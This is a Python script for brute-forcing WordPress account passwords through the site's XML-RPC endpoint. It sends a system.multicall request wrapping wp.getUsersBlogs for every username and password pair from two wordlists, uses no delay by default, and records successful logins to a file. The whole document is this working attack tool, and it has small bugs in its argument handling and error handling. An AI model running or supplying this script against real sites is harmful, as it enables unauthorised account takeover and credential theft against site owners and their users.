import requests
import sys
import time

WAIT_TIME = 0

def usage():
    print(f"Usage: {sys.argv[0]} target_url passwords_file usernames_file [result_file]", file=sys.stderr)

def make_body(username, password):
    body = \
f"""<?xml version="1.0"?>
    <methodCall>
        <methodName>system.multicall</methodName>
        <params>
            <param>
                <value>
                    <array>
                        <data>
                            <value>
                                <struct>
                                    <member>
                                        <name>methodName</name>
                                        <value>
                                            <string>wp.getUsersBlogs</string>
                                        </value>
                                    </member>
                                    <member>
                                        <name>params</name>
                                        <value>
                                            <array>
                                                <data>
                                                    <value>
                                                        <array>
                                                            <data>
                                                                <value>
                                                                    <string>{username}</string>
                                                                </value>
                                                                <value>
                                                                    <string>{password}</string>
                                                                </value>
                                                            </data>
                                                        </array>
                                                    </value>
                                                </data>
                                            </array>
                                        </value>
                                    </member>
                                </struct>
                            </value>
                        </data>
                    </array>
                </value>
            </param>
        </params>
    </methodCall>
"""
    return body

def send_req(url, body):
    req = requests.post(url, data=body, headers={"Content-Type":"application/xml"}).text
    if "incorrect" in req.casefold():
        return False
    elif "admin" in req.casefold():
        return True
    else:
        raise ValueError("[-] Invalid Response")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        usage()
        sys.exit(1)

    url = sys.argv[1]
    pwd_file = sys.argv[2]
    user_file = sys.argv[3]

    if len(sys.argv) > 4:
        res_file = open(sys.argv[4], "w")
    
    with open(user_file, "r", errors = "ignore") as uf:
        users = [x.strip() for x in uf.readlines() if x.strip()]
    with open(pwd_file, "r", errors = "ignore") as pf:
        passwords = [x.strip() for x in pf.readlines() if x.strip()]

    for username in users:
        for password in passwords:
            infostr = f"[@] username: {username} password: {password}"
            print(infostr, file=sys.stderr, end="\r")
            body = make_body(username, password)
            try:
                res = send_req(url, body)
            except ValueError as e:
                print(f"\n{e}", file=sys.stderr)
            if res:
                if len(sys.argv) > 4:
                    print(f"{username}:{password}", file=res_file)
                print(f"[+]{infostr[3:]} -> SUCCESS!", file=sys.stderr)
            else:
                print(" "*len(infostr), end="\r")

            time.sleep(WAIT_TIME)
    
    if len(sys.argv) > 4:
        res_file.close()

    sys.exit(0)
